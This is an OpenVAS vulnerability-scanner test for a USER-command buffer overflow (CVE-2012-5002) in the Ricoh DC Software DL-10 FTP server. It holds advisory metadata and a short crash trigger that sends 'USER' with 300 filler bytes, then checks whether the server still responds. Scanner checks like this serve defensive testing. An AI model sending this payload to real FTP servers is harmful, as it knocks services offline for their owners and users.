###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ricoh_dc_dl10_ftp_user_bof_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# Ricoh DC Software DL-10 FTP Server 'USER' Command Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902821");
  script_version("$Revision: 4690 $");
  script_cve_id("CVE-2012-5002");
  script_bugtraq_id(52235);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-03-26 14:14:14 +0530 (Mon, 26 Mar 2012)");
  script_name("Ricoh DC Software DL-10 FTP Server 'USER' Command Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://secunia.com/advisories/47912");
  script_xref(name:"URL", value:"http://security.inshell.net/advisory/5");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52235");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73591");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18643");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18658");

  tag_impact = "Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the affected application. Failed exploit
  attempts will result in a denial-of-service condition.

  Impact Level: System/Application";

  tag_affected = "Ricoh DC Software DL-10 version 4.5.0.1";

  tag_insight = "The flaw is caused by improper bounds checking by the FTP server
  when processing malicious FTP commands. This can be exploited to cause a
  stack-based buffer overflow via an overly long 'USER' FTP command.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "This host is running Ricoh DC Software DL-10 FTP Server and is
  prone to buffer overflow vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("ftp_func.inc");

## Variable Initialization
soc = 0;
soc1 = 0;
banner = "";
exploit = "";
ftpPort = 0;

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(! ftpPort){
  ftpPort = 21;
}

## check port status
if(! get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:ftpPort);
if(! banner || "DSC ftpd" >!< banner){
  exit(0);
}

## Open FTP Socket
soc = open_sock_tcp(ftpPort);
if(! soc){
  exit(0);
}

## Build Exploit
exploit = "USER " + crap(300);

## Send the Attack Request
ftp_send_cmd(socket:soc, cmd:exploit);
ftp_close(socket:soc);
sleep (2);

## Open the socket to confirm FTP server is alive
soc1 = open_sock_tcp(ftpPort);
if(! soc1)
{
  security_message(ftpPort);
  exit(0);
}
ftp_close(socket:soc1);
